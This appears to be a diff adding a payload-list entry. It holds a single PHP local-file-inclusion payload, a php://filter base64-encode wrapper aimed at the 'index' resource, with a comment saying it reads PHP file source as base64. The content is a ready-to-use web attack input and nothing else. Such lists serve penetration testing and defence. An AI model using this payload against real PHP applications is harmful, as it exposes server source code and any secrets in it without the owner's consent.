@@ -1,0 +1,3 @@
+//LFI PHP Wrapper to get content of php files in base64 format
+
+php://filter/convert.base64-encode/resource=index
